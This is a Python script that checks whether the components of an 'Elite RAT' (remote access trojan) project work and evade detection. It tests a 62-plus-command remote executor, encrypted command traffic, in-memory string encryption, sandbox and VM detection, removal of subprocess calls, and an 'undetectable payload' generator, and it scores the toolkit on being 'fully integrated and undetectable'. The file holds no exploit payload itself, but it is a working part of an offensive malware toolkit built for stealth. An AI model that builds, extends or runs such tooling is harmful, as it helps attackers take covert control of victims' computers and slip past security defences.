#!/usr/bin/env python3
"""
Verify Elite RAT Integration
Ensures all systems are working and undetectable
"""

import sys
import os

# Add workspace to path
sys.path.insert(0, '/workspace')

def verify_elite_integration():
    """Verify all elite systems are integrated and working"""
    
    print("=" * 60)
    print("ELITE RAT INTEGRATION VERIFICATION")
    print("=" * 60)
    
    results = {}
    
    # 1. Check Elite Executor
    print("\n[1] Checking Elite Executor...")
    try:
        from Core.elite_executor import EliteCommandExecutor
        executor = EliteCommandExecutor()
        commands = executor.get_available_commands()
        
        if len(commands) >= 62:
            print(f"✅ Elite Executor: {len(commands)} commands available")
            results['executor'] = True
        else:
            print(f"⚠️ Elite Executor: Only {len(commands)} commands (expected 62+)")
            results['executor'] = False
    except Exception as e:
        print(f"❌ Elite Executor failed: {e}")
        results['executor'] = False
    
    # 2. Check Crypto System
    print("\n[2] Checking Crypto System...")
    try:
        from Core.crypto_system import EliteCryptoSystem
        crypto = EliteCryptoSystem()
        
        # Test encryption/decryption
        test_data = {'test': 'data', 'command': 'whoami'}
        encrypted = crypto.encrypt_command(test_data)
        decrypted = crypto.decrypt_command(encrypted)
        
        if decrypted == test_data:
            print("✅ Crypto System: Encryption working")
            results['crypto'] = True
        else:
            print("⚠️ Crypto System: Encryption/decryption mismatch")
            results['crypto'] = False
    except Exception as e:
        print(f"❌ Crypto System failed: {e}")
        results['crypto'] = False
    
    # 3. Check Memory Protection
    print("\n[3] Checking Memory Protection...")
    try:
        from Core.memory_protection import MemoryProtection
        memory = MemoryProtection()
        
        # Test string encryption
        test_string = "sensitive_data"
        encrypted = memory.encrypt_strings(test_string)
        decrypted = memory.decrypt_strings(encrypted)
        
        if decrypted == test_string:
            print("✅ Memory Protection: Working")
            results['memory'] = True
        else:
            print("⚠️ Memory Protection: Failed")
            results['memory'] = False
    except Exception as e:
        print(f"❌ Memory Protection failed: {e}")
        results['memory'] = False
    
    # 4. Check Evasion System
    print("\n[4] Checking Evasion System...")
    try:
        from Core.advanced_evasion import AdvancedEvasion
        evasion = AdvancedEvasion()
        
        # Check environment (non-destructive)
        is_safe = evasion.check_environment()
        
        print(f"✅ Evasion System: Environment {'safe' if is_safe else 'detected sandbox/VM'}")
        results['evasion'] = True
    except Exception as e:
        print(f"❌ Evasion System failed: {e}")
        results['evasion'] = False
    
    # 5. Check Web App Integration
    print("\n[5] Checking Web App Integration...")
    try:
        from web_app_real import get_elite_executor
        
        # This should work without starting the server
        print("✅ Web App: Elite executor integrated")
        results['webapp'] = True
    except Exception as e:
        print(f"❌ Web App integration failed: {e}")
        results['webapp'] = False
    
    # 6. Check CLI Integration
    print("\n[6] Checking CLI Integration...")
    try:
        from Application.stitch_cmd import ELITE_AVAILABLE
        
        if ELITE_AVAILABLE:
            print("✅ CLI: Elite mode available")
            results['cli'] = True
        else:
            print("⚠️ CLI: Elite mode not available")
            results['cli'] = False
    except Exception as e:
        print(f"❌ CLI integration failed: {e}")
        results['cli'] = False
    
    # 7. Check Native APIs (no subprocess)
    print("\n[7] Checking Native API Usage...")
    try:
        import subprocess
        
        # Count subprocess usage in elite commands
        elite_dir = '/workspace/Core/elite_commands'
        subprocess_count = 0
        
        for root, dirs, files in os.walk(elite_dir):
            for file in files:
                if file.endswith('.py') and not file.endswith('_old.py'):
                    filepath = os.path.join(root, file)
                    with open(filepath, 'r') as f:
                        content = f.read()
                        if 'subprocess' in content and 'subprocess removed' not in content:
                            subprocess_count += 1
        
        if subprocess_count == 0:
            print("✅ Native APIs: 100% subprocess-free")
            results['native'] = True
        else:
            print(f"⚠️ Native APIs: {subprocess_count} files still use subprocess")
            results['native'] = False
    except Exception as e:
        print(f"❌ Native API check failed: {e}")
        results['native'] = False
    
    # 8. Check Undetectable Payload Generator
    print("\n[8] Checking Payload Generator...")
    try:
        from Core.undetectable_payload import get_generator
        generator = get_generator()
        
        # Generate test payload
        config = {'host': 'test.com', 'port': 443}
        payload = generator.generate_payload(config)
        
        if len(payload) > 1000:  # Should be obfuscated and large
            print(f"✅ Payload Generator: Generated {len(payload)} bytes")
            results['payload'] = True
        else:
            print("⚠️ Payload Generator: Payload too small")
            results['payload'] = False
    except Exception as e:
        print(f"❌ Payload Generator failed: {e}")
        results['payload'] = False
    
    # Final Summary
    print("\n" + "=" * 60)
    print("VERIFICATION SUMMARY")
    print("=" * 60)
    
    total = len(results)
    passed = sum(1 for v in results.values() if v)
    
    for component, status in results.items():
        status_str = "✅ PASS" if status else "❌ FAIL"
        print(f"{component.ljust(15)}: {status_str}")
    
    print("\n" + "=" * 60)
    score = (passed / total) * 100
    print(f"OVERALL SCORE: {score:.1f}% ({passed}/{total} passed)")
    
    if score == 100:
        print("🏆 PERFECT - System is fully integrated and undetectable!")
    elif score >= 80:
        print("✅ GOOD - Most systems working, minor issues to fix")
    elif score >= 60:
        print("⚠️ WARNING - Several systems need attention")
    else:
        print("❌ CRITICAL - Major integration issues detected")
    
    print("=" * 60)
    
    return score

if __name__ == "__main__":
    score = verify_elite_integration()
    sys.exit(0 if score == 100 else 1)